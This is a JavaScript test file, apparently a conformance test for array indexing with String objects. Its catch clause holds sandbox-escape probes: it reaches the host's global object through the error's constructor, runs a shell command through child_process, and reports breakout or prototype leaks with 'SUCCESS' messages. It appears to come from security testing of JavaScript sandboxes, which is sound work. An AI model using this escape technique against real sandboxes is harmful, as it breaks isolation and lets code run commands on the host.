try {
    var x = [];
    x[new String('0')] = 0;
    if (x[0] !== 0) {
        $ERROR('#1: x = []; x[new String("0")] = 0; x[0] === 0. Actual: ' + x[0]);
    }
    var y = [];
    y[new String('1')] = 1;
    if (y[1] !== 1) {
        $ERROR('#2: y = []; y[new String("1")] = 1; y[1] === 1. Actual: ' + y[1]);
    }
    var z = [];
    z[new String('1.1')] = 1;
    if (z['1.1'] !== 1) {
        $ERROR('#3: z = []; z[new String("1.1")] = 1; z["1.1"] === 1. Actual: ' + z['1.1']);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}